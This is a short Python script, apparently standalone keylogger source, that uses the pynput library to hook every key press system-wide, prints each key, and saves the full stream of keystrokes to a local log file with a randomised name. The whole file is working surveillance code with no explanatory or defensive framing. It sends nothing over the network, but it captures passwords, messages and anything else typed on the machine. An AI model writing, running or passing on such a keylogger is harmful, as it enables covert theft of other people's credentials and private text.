import pynput
from pynput.keyboard import Key, Listener
import random
import string

keys = []
rng = [random.choice(string.ascii_letters[:94]) for x in range(8)]
   
def on_press(key):
    keys.append(key)
    write_file(keys)

    try:
        print(str(key.char))
    except AttributeError:
        print(str(key))
           
def write_file(keys):
    with open('log-'+''.join(rng)+'.txt', 'w') as f:
        for key in keys:
            if str(key) != None and 'Key' in str(key):
                f.write('\n') 
                f.write(str(key).replace("'", ""))
                f.write('\n')
            else: 
                f.write(str(key).replace("'", ""))
            
   
with Listener(on_press = on_press) as listener:
    listener.join()